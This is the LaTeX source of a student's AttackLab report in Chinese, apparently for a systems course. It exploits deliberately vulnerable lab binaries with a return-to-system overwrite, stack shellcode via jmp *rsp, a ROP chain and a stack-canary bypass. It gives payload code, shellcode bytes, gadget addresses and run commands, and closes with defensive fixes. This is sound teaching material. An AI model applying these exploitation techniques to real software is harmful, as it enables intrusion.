% !TeX program = xelatex
% 编译：xelatex lab3-report.tex，跑两遍
\documentclass[UTF8,11pt,fontset=fandol]{ctexart}
\usepackage[a4paper,left=24mm,right=24mm,top=24mm,bottom=24mm]{geometry}
\usepackage{booktabs,tabularx,array,amsmath,amssymb}
\usepackage{listings}
\usepackage[hidelinks]{hyperref}
\setlength{\parindent}{2em}
\linespread{1.35}
\lstset{
  basicstyle=\ttfamily\small,
  breaklines=true,
  columns=fullflexible,
  keepspaces=true,
  showstringspaces=false,
  frame=single,
  aboveskip=6pt,
  belowskip=6pt
}
\newcolumntype{L}{>{\raggedright\arraybackslash}X}
\newcommand{\code}[1]{\texttt{#1}}

\begin{document}
\pagestyle{plain}
\setlength{\emergencystretch}{2em}

\begin{center}
{\Large\bfseries AttackLab 实验报告}\\[6pt]
李林蔚\quad 25800190092\\[2pt]
2026 年 11 月 25 日
\end{center}

\section{实验环境}

实验在课程服务器上完成。系统是 Ubuntu 24.04，内核 6.8.0-138，gdb 15.1，glibc 2.39。仓库里的 \code{dark-calc}、\code{dark-calc-nx}、\code{dark-log} 都是非 PIE 的 x86-64 ELF，代码段地址在每次运行时固定，所以 payload 里可以直接写绝对地址，不需要先泄露基址。

有一个地方和实验指南的描述不完全一样：\code{dark-calc} 的 \code{GNU\_STACK} 标的是 \code{RW}，但程序自己在构造函数里建了一块可执行栈，后面第五节会细说。\code{dark-calc-nx} 和 \code{dark-log} 用的则是普通栈，不可执行；\code{dark-log} 还开了 Stack Protector。

\section{input 函数的栈帧}

\subsection{调用者}

我在 \code{0x40197f}（\code{input} 的 prologue 之后）下断点，\code{bt} 只给出两层：

\begin{lstlisting}
#0  0x000000000040197f in input ()
#1  0x0000000000401ad1 in main ()
\end{lstlisting}

说明这次是 \code{main} 调进来的。\code{disas main} 里对应的指令在 \code{0x401acc} 处，是 \code{call 0x401977 <input>}，返回地址 \code{0x401ad1} 正好是 \code{main+14}。

\subsection{前三条指令和 rbp 处的值}

\code{input} 的开头是再普通不过的函数序言：

\begin{center}
\begin{tabular}{@{}lll@{}}
\toprule
地址 & 指令 & 作用\\
\midrule
\code{0x401977} & \code{push \%rbp} & 保存调用者的帧指针\\
\code{0x401978} & \code{mov \%rsp,\%rbp} & 以当前栈顶作为本帧基址\\
\code{0x40197b} & \code{sub \$0x10,\%rsp} & 给 16 字节的 \code{expression} 腾地方\\
\bottomrule
\end{tabular}
\end{center}

断下时 \code{rbp=0x721000800fe0}，\code{rsp=0x721000800fd0}。\code{[rbp]} 里是 \code{0x721000800ff0}，这是 \code{main} 的 \code{rbp}。它的来源可以顺着往回看：\code{main} 在 \code{0x401ac3} 处 \code{push \%rbp}，把更外层的 \code{rbp}（\code{0x7fffffffebd0}）压栈，然后在 \code{0x401ac4} 处 \code{mov \%rsp,\%rbp}，于是 \code{main} 的 \code{rbp} 变成 \code{0x721000800ff0}；\code{input} 再 \code{push \%rbp}，把这个值存到自己的 \code{[rbp]}。

\code{[rbp+8]} 是 \code{0x401ad1}。这个值不是 \code{input} 写进去的，而是 \code{main} 执行 \code{call} 时由 CPU 压进去的。单步看一下就很清楚：在 \code{0x401acc} 处停下时 \code{rsp=0x721000800ff0}，执行 \code{call} 之后 \code{rsp} 减 8 变成 \code{0x721000800fe8}，这个地址的内容就是 \code{0x401ad1}，同时 \code{rip} 跳到 \code{0x401977}。\code{input} 的 \code{push \%rbp} 又让 \code{rsp} 减 8，最后形成下面这个布局：

\begin{lstlisting}
0x721000800ff8  0x401c1f              __wrap_main 中 call main 的返回地址
0x721000800ff0  0x7fffffffebd0        main 保存的旧 rbp
0x721000800fe8  0x401ad1              main 中 call input 的返回地址
0x721000800fe0  0x721000800ff0        input 保存的 main 的 rbp
0x721000800fd0  expression[16]
\end{lstlisting}

\subsection{leave 和 ret}

在 \code{0x4019d5}（\code{leave}）处断下时，\code{rbp=0x721000800fe0}、\code{rsp=0x721000800fd0}。单步执行 \code{leave}，它先把 \code{rsp} 改成 \code{rbp}，再弹出 \code{[rbp]}，于是 \code{rbp=0x721000800ff0}、\code{rsp=0x721000800fe8}，栈顶正好是 \code{0x401ad1}。再单步执行 \code{ret}，\code{rip} 变成 \code{0x401ad1}，\code{rsp} 回到 \code{0x721000800ff0}，控制流回到 \code{main}。

\begin{lstlisting}
===== at leave =====
rsp  0x721000800fd0   rbp  0x721000800fe0
0x721000800fe0:  0x0000721000800ff0  0x0000000000401ad1
===== after leave =====
rsp  0x721000800fe8   rbp  0x721000800ff0
[rsp] = 0x0000000000401ad1
===== after ret =====
rip  0x401ad1 <main+14>   rsp  0x721000800ff0
\end{lstlisting}

所以 \code{call} 做的是压返回地址并跳转；prologue 保存调用者的 \code{rbp}、建立本帧、给局部变量分配空间；\code{leave} 把 \code{rsp} 拉回 \code{rbp} 并弹出旧 \code{rbp}；\code{ret} 从栈顶取返回地址送回 \code{rip}。这一套动作保证了函数可以一层层调用，返回时栈还能原样退回去。

\section{用 20 和 32 个字符试溢出}

\code{expression} 只有 16 字节，\code{gets} 又不检查长度，所以多出来的字节会依次盖掉保存的 \code{rbp}（偏移 16）和返回地址（偏移 24）。我先按指南输入了 20 个和 32 个 \code{A}。

20 个字符加 \code{gets} 补的 \code{\textbackslash 0} 一共 21 字节，只盖到保存 \code{rbp} 的低 5 个字节，返回地址还是好的。GDB 里 \code{[rbp]} 变成 \code{0x0000720041414141}，\code{[rbp+8]} 仍是 \code{0x401ad1}。程序没有立刻崩溃，因为 \code{input} 返回后 \code{main} 还能调用 \code{eval} 算一次；下一轮再进 \code{input} 时标准输入已经 EOF，\code{gets} 返回 \code{NULL}，程序走 \code{puts(answer); exit(0)} 分支，没有再用坏掉的 \code{rbp} 去写缓冲区。实际输出是：

\begin{lstlisting}
Executing: echo $((AAAAAAAAAAAAAAA))
0
Enter an expression (length up to 15):
42_is_The_Ànswer
\end{lstlisting}

最后一行原串里的 \code{À} 在 \code{cat -v} 下会显示成转义形式，这里按原样写出。

32 个字符加 \code{\textbackslash 0} 是 33 字节，保存的 \code{rbp} 和返回地址都被 \code{0x4141414141414141} 覆盖。\code{input} 的 \code{leave; ret} 直接把 \code{0x4141414141414141} 装进 \code{rip}，进程收 \code{SIGSEGV}，退出码 139。GDB 里两条都是 \code{0x4141414141414141}：

\begin{lstlisting}
===== after gets, 20 bytes =====
0x721000800fe0:  0x0000720041414141  0x0000000000401ad1
===== after gets, 32 bytes =====
0x721000800fe0:  0x4141414141414141  0x4141414141414141
\end{lstlisting}

顺带一提，32 字节时 \code{strcpy(command\_buf, expression)} 也会把 33 字节写进只有 31 字节的 \code{command\_buf}，越界两个字节。不过这次返回地址先被破坏，程序在 \code{leave; ret} 处就挂了，全局数组的越界还没来得及表现。

\section{任务一：跳到 system 执行 malware}

\code{eval} 正常会把表达式包装成 \code{echo \$((...))} 再交给 \code{system}，但我们的目的不是算数，而是执行当前目录下的 \code{./malware}。反汇编里 \code{0x401a6b} 正好是：

\begin{lstlisting}
0x401a6b <eval+148>:  mov $0x6030d0,%edi
0x401a70 <eval+153>:  call 0x4017e0 <system@plt>
\end{lstlisting}

只要把返回地址改成 \code{0x401a6b}，\code{input} 一返回就会直接调用 \code{system(command\_buf)}，省掉 \code{eval} 的包装。\code{command\_buf} 是全局数组，地址 \code{0x6030d0}。\code{input} 在 \code{gets} 之后还会执行 \code{strcpy}，把 \code{expression} 复制进 \code{command\_buf}；\code{strcpy} 遇到第一个 \code{\textbackslash 0} 就停，所以 payload 开头写成 \code{"./malware\textbackslash 0"}，后面随便填，\code{command\_buf} 里最终只会留下 \code{"./malware"}。

payload 一共 32 字节：前 10 字节是 \code{"./malware\textbackslash 0"}，接着 14 个 \code{A} 填满 16 字节数组和保存的 \code{rbp}，最后 8 字节是 \code{0x401a6b}。

\begin{lstlisting}
payload  = b"./malware\x00"
payload += b"A" * (24 - len(payload))
payload += struct.pack("<Q", 0x401A6B)
\end{lstlisting}

运行时 \code{malware} 会顺着父进程链检查是不是 \code{dark-calc} 触发的，\code{system} 通过 \code{/bin/sh -c} 启动它，祖先进程正好是 \code{dark-calc}，所以检查通过。输出里有：

\begin{lstlisting}
### The bomb was triggered by the dark-calc process. ###
### You have successfully detonated the bomb! Congratulations! ###
\end{lstlisting}

GDB 在 \code{0x401a6b} 断下时 \code{rdi=0x6030d0}，\code{x/s 0x6030d0} 显示 \code{"./malware"}，和预期一致。消息打印完以后进程会因为被改坏的 \code{rbp} 在 \code{eval} 的 \code{leave; ret} 处挂掉（实测退出码 135），但那时输出已经写完了，自动评分只看标准输出，不影响结果。

\section{main 的机器码和栈上执行}

\subsection{main 的前三条指令}

在 \code{0x401ac3} 处断下，\code{x/9xb} 看到的是：

\begin{lstlisting}
0x401ac3 <main>:  0x55 0x48 0x89 0xe5 0xb8 0x00 0x00 0x00
0x401acb <main+8>:  0x00
\end{lstlisting}

对应三条指令：

\begin{center}
\begin{tabular}{@{}llll@{}}
\toprule
字节区间 & 机器码 & 汇编 & 长度\\
\midrule
$[0x401ac3,0x401ac4)$ & \code{55} & \code{push \%rbp} & 1\\
$[0x401ac4,0x401ac7)$ & \code{48 89 e5} & \code{mov \%rsp,\%rbp} & 3\\
$[0x401ac7,0x401acc)$ & \code{b8 00 00 00 00} & \code{mov \$0x0,\%eax} & 5\\
\bottomrule
\end{tabular}
\end{center}

这些字节在内存里就是按地址从小到大排的：\code{0x401ac3} 是 \code{55}，\code{0x401ac4} 开始是 \code{48 89 e5}，\code{0x401ac7} 开始是 \code{b8 00 00 00 00}。用 \code{si} 逐条走，\code{rip} 依次变成 \code{0x401ac4}、\code{0x401ac7}、\code{0x401acc}，相对 \code{main} 的偏移是 1、4、9，刚好等于三条指令的长度。x86-64 的指令是变长的，CPU 从 \code{rip} 指向的字节开始解码，再按指令长度走到下一条。

\subsection{dark-calc 的栈其实在别处}

准备栈上 shellcode 时，我先按常规思路在 \code{[stack]} 上找缓冲区地址，结果 \code{info proc mappings} 显示 \code{rsp} 根本不在 \code{[stack]}，而在 \code{0x721000...} 一块 \code{rwxp} 映射里。后来看反汇编才发现 \code{dark-calc} 注册了 \code{init\_fixed\_stack}：它在固定地址 \code{0x721000000000} 处做了一次 \code{mmap}，长度 \code{0x802000}，权限是读写执行；然后把首尾各一页 \code{mprotect} 成不可访问，并把 \code{fixed\_stack\_top} 设成 \code{0x721000801000}。\code{\_\_wrap\_main} 在调用 \code{main} 之前把 \code{rsp} 切到这块栈上。

\begin{lstlisting}
0x721000001000  0x721000801000  0x800000  0x0  rwxp
\end{lstlisting}

这样一来，任务二的“栈执行”其实是程序自己开的 \code{rwxp} 栈，不是内核默认的可执行栈。也正因为 \code{fixed\_stack\_top} 就在映射末尾，\code{main} 和 \code{input} 只用到栈顶下面 \code{0x30} 字节，\code{expression} 在 \code{0x721000800fd0}，从缓冲区到映射结束只有 48 字节。我第一版 payload 带了 \code{exit} 系统调用，一共 57 字节，运行直接段错误；后来把退出部分删掉，压到 44 字节才通过。

\subsection{jmp 到栈上}

\code{dark-calc} 的可执行 LOAD 段里，\code{0x401e0b} 有两个字节 \code{ff e4}，即 \code{jmp *\%rsp}。把返回地址覆盖成 \code{0x401e0b}，\code{input} 的 \code{ret} 就会跳到这里；此时 \code{rsp} 指向返回地址后面的 8 字节，也就是我放在那里的 shellcode。这样不用知道栈的绝对地址，也不依赖 \code{fixed\_stack\_top} 的具体值。

\pagebreak[4]
shellcode 只有 12 字节：

\begin{lstlisting}
bf 04 00 00 00    mov $0x4,%edi
b8 87 1a 40 00    mov $0x401a87,%eax
ff d0             call *%rax
\end{lstlisting}

不能用 \code{call rel32}，因为 shellcode 在栈上，栈地址和代码段的距离不是常数；先用 \code{mov \$imm32,\%eax} 把地址装进 \code{eax}，再用 \code{call *\%rax} 调过去，就可以把 \code{grade\_eval} 的绝对地址编进指令。进入 shellcode 时 \code{rsp=0x721000800ff0}，是 16 的倍数，\code{call *\%rax} 压 8 字节后 \code{grade\_eval} 入口的 \code{rsp\%16=8}，符合 ABI。

payload 是 16 个 \code{A}、8 字节随便填的 \code{rbp}、\code{0x401e0b}，再加 12 字节 shellcode，总共 44 字节。GDB 在 \code{grade\_eval} 断下时 \code{rdi=4}，返回地址 \code{0x721000800ffc} 正是 \code{call} 的下一条：

\begin{lstlisting}
Breakpoint 1, 0x0000000000401a87 in grade_eval ()
rip  0x401a87 <grade_eval>   rsp  0x721000800fe8   rdi  0x4
#0  0x0000000000401a87 in grade_eval ()
#1  0x0000721000800ffc in ?? ()
\end{lstlisting}

输出里有 \code{Hope A will be your grade!}。\code{grade\_eval} 返回后没有 \code{exit} 可走，控制流落到 \code{0x800ffc} 后面的零字节并崩溃，不过 \code{grade\_eval} 内部已经 \code{fflush(stdout)}，消息不会丢。

\section{任务三：NX 栈上的 ROP}

\code{dark-calc-nx} 的栈不可执行，但代码段是非 PIE，地址固定。任务提示说 gadget 在 \code{0x4019d0} 到 \code{0x401ae3} 之间，这一段就是 \code{\_\_libc\_csu\_init}。正常反汇编里没有 \code{pop rdi; ret}，但 \code{0x401a32} 处的 \code{41 5f} 是 \code{pop r15}，从第二个字节 \code{5f} 开始就是 \code{pop rdi}，下一个字节 \code{c3} 正好是 \code{ret}：

\begin{lstlisting}
0x401a33 <__libc_csu_init+99>:   pop %rdi
0x401a34 <__libc_csu_init+100>:  ret
\end{lstlisting}

这种从指令中间切进去的 gadget 在 ROP 里很常见，CPU 不管前面的 \code{41}，从 \code{5f} 开始解码就行。

链是：16 字节填充、8 字节保存的 \code{rbp}、\code{0x401a33}、参数 4、\code{0x401a34}、\code{0x401978}。GDB 在 \code{leave} 前 dump 出来的栈是：

\begin{lstlisting}
0x7fffffffeb10:  0x4141414141414141  0x4141414141414141
0x7fffffffeb20:  0x4141414141414141  0x0000000000401a33
0x7fffffffeb30:  0x0000000000000004  0x0000000000401a34
0x7fffffffeb40:  0x0000000000401978
\end{lstlisting}

中间多放一个 \code{0x401a34} 是为了栈对齐。\code{ret} 进入 \code{grade\_eval} 时，\code{rsp} 应该等于正常 \code{call} 之后的值，也就是 \code{\%16=8}。如果链是 \code{pop rdi; ret -> 4 -> grade\_eval}，进入 \code{grade\_eval} 时 \code{rsp\%16=0}，\code{push \%rbp} 之后更不正；有些 glibc 的 \code{printf} 会因为 \code{movaps} 要求 16 字节对齐而崩。我一开始没加这个 \code{ret}，本机也能跑通，但加上以后和编译器生成的调用完全一致，换环境更稳。

在 \code{0x401978} 断下时 \code{rdi=4}，输出同样包含 \code{Hope A will be your grade!}。\code{grade\_eval} 返回后跳到链外的栈数据并崩溃，但输出已经刷新。

\section{任务四：绕过 Canary}

\code{dark-log} 的 \code{input} 里，\code{expression} 在 \code{rbp-0x120}，\code{logMsg} 在 \code{rbp-0xa0}，\code{len} 在 \code{rbp-0x20}，canary 在 \code{rbp-0x8}。以 \code{expression} 首字节为 0，各字段偏移是：

\begin{center}
\begin{tabular}{@{}lll@{}}
\toprule
字段 & 相对 \code{rbp} & 相对 \code{expression}\\
\midrule
\code{expression[128]} & \code{rbp-0x120} & 0--127\\
\code{logMsg[128]} & \code{rbp-0xa0} & 128--255\\
\code{int len} & \code{rbp-0x20} & 256--259\\
\code{pad[8]} & \code{rbp-0x1c}--\code{rbp-0x15} & 260--267\\
canary & \code{rbp-0x8} & 280--287\\
保存的 \code{rbp} & \code{rbp} & 288--295\\
返回地址 & \code{rbp+8} & 296--303\\
\bottomrule
\end{tabular}
\end{center}

\code{input} 先 \code{gets(f.expression)}，再 \code{memcpy(f.logMsg + f.len, f.expression, 128)}。第一次 \code{gets} 可以一路写进 \code{logMsg} 和 \code{len}，但到不了 canary；第二次 \code{memcpy} 长度固定 128，目标却由被改写的 \code{len} 决定。于是可以先用 \code{gets} 改 \code{len}，再让程序自己把返回地址盖掉，canary 一个字节都不碰。

\code{logMsg} 的首地址是 \code{rbp-0xa0}，取 \code{len=0xa0}，\code{memcpy} 的目标就是 \code{rbp}，复制范围 \code{[rbp, rbp+0x7f]}，正好盖住保存的 \code{rbp} 和返回地址。\code{gets} 的 payload 只写到偏移 259，加 \code{gets} 补的 \code{\textbackslash 0} 到 260，离 canary 还有 20 字节，所以 canary 保持原值。

payload 的前 32 字节同时是第二次复制的源和新链：偏移 0--7 是新的 \code{rbp}（随便填），8--15 盖返回地址，放 \code{0x4018a3}（\code{pop rdi; ret}），16--23 放参数 4，24--31 放 \code{0x401677}（\code{grade\_eval}）。偏移 256--259 写 \code{len=0xa0}。

GDB 里 \code{gets} 之后 \code{len} 已经是 \code{0xa0}，canary 是 \code{0x3ae25921b27d1000}，和 \code{fs:0x28} 一样；到 \code{0x4017df} 的校验处，canary 仍然是这个值，而 \code{[rbp+8]} 已经被改成 \code{0x4018a3}：

\begin{lstlisting}
len at rbp-0x20:   0x000000a0
canary at rbp-0x8: 0x3ae25921b27d1000
fs:0x28:           0x3ae25921b27d1000
0x7fffffffeb20: 0x0000000000000000  0x00000000004018a3
0x7fffffffeb28: 0x00000000004018a3  0x0000000000000004
0x7fffffffeb38: 0x0000000000401677
\end{lstlisting}

继续走到 \code{grade\_eval}，\code{rdi=4}，输出包含 \code{Hope A will be your grade!}。这条链不需要额外的 \code{ret}：\code{input} 返回后 \code{rsp\%16=8}，\code{pop rdi} 后变成 0，\code{ret} 进入 \code{grade\_eval} 时又回到 8。

\subsection{局部变量应该怎么排}

Canary 只保护返回地址前面那 8 个字节，结构体里的 \code{len} 它管不到。这个攻击能成立，是因为 \code{gets} 先改了 \code{len}，再借 \code{memcpy} 把写操作搬到 \code{rbp} 附近。要堵住它，最直接的办法是把 \code{len} 放到 \code{expression} 的低地址一侧，比如结构体最前面。这样 \code{gets} 向高地址溢出时先经过 \code{logMsg}，碰不到 \code{len}，\code{len} 保持 0，\code{memcpy} 的目标就固定在 \code{logMsg}，够不到返回地址。

也可以把 \code{len} 挪到 canary 后面、返回地址前面，让 canary 把它盖住；这样改 \code{len} 必然先破坏 canary。更根本的修法是检查长度：把 \code{len} 声明成 \code{size\_t}，判断 \code{len <= sizeof(f.logMsg) - sizeof(f.expression)}，同时用 \code{fgets} 换掉 \code{gets}。编译器做 Stack Protector 优化时会把字符数组尽量放高地址、把标量放低地址，思路也是一样的：让溢出先撞到 canary，而不是先撞到控制长度的变量。这个题因为结构体把顺序钉死了，才留下了空隙。

\section{ASLR 和 NX 的几点观察}

\code{src/aslr.c} 打印局部变量地址。在服务器上连跑五次：

\begin{lstlisting}
0x7ffe6f896254
0x7ffe864ab724
0x7ffd16960474
0x7ffce0f7cd14
0x7fff03f7a054
\end{lstlisting}

每次都不一样，说明栈的起始地址被 ASLR 随机化了。在 gdb 里两次都得到 \code{0x7fffffffeb44}，因为 gdb 默认关闭 ASLR，方便调试。\code{/proc/sys/kernel/randomize\_va\_space} 的值是 2。

\code{dark-calc-nx} 和 \code{dark-log} 的 \code{GNU\_STACK} 都是 \code{RW}，栈页不可执行，所以任务二那种在栈上放 shellcode 的办法对它们无效；ROP 只使用代码段里现成的 \code{ret} 结尾片段，把多个 gadget 串起来。非 PIE 让 \code{.text} 基址固定，gadget 地址可以直接写死；如果换成 PIE，还得先泄露代码段基址。

\section{测试结果}

四个 payload 都按仓库里 \code{lab3-checks.yml} 的方式测：脚本把二进制写到 stdout，\code{attack/} 下的目标程序读 stdin，检查输出里有没有目标字符串。第一个的目标是被 detonate 的那句，后三个都是 \code{Hope A will be your grade!}，实测都出现了。字节数和结果如下。

\begin{center}
\begin{tabular}{@{}llrl@{}}
\toprule
payload & 目标 & 字节数 & 结果\\
\midrule
\code{payload.py} & \code{dark-calc} & 32 & PASS\\
\code{payload\_dark.py} & \code{dark-calc} & 44 & PASS\\
\code{payload\_rop.py} & \code{dark-calc-nx} & 56 & PASS\\
\code{payload\_canary.py} & \code{dark-log} & 260 & PASS\\
\bottomrule
\end{tabular}
\end{center}

\pagebreak[3]
复现命令：

\begin{lstlisting}
python3 payload.py        > /tmp/p1 && (cd attack && ./dark-calc    < /tmp/p1)
python3 payload_dark.py   > /tmp/p2 && (cd attack && ./dark-calc    < /tmp/p2)
python3 payload_rop.py    > /tmp/p3 && (cd attack && ./dark-calc-nx < /tmp/p3)
python3 payload_canary.py > /tmp/p4 && (cd attack && ./dark-log     < /tmp/p4)
\end{lstlisting}

四个程序在打印目标字符串后大多会收到 \code{SIGSEGV} 或 \code{SIGBUS}，这是故意没有去修返回路径的结果。自动评分只匹配标准输出，所以都算通过。如果想让进程干净退出，可以在链尾再放 \code{exit@plt}，但 \code{dark-calc} 的栈顶只剩那么点空间，任务二放不下。

\section{做完之后}

这个 lab 做下来，最有意思的是 \code{dark-calc} 的栈：看 \code{GNU\_STACK} 会以为它是不可执行的，实际运行时却发现 \code{rsp} 在一块 \code{rwxp} 映射里，追下去才看到 \code{init\_fixed\_stack} 和 \code{\_\_wrap\_main}。另外，canary 那一题也让我意识到，保护机制往往只盯着它认为最重要的那个返回地址，结构体里的长度字段如果和缓冲区挨得太近，还是会被拿来做文章。

\vspace{4pt}
\noindent\small
参考资料：\href{https://ics-26fall-fdu.github.io/labs/lab3-attack-lab/}{课程实验指南}；
\href{https://github.com/jackeylilw-lab/lab3-attacklab}{实验仓库}。

\end{document}
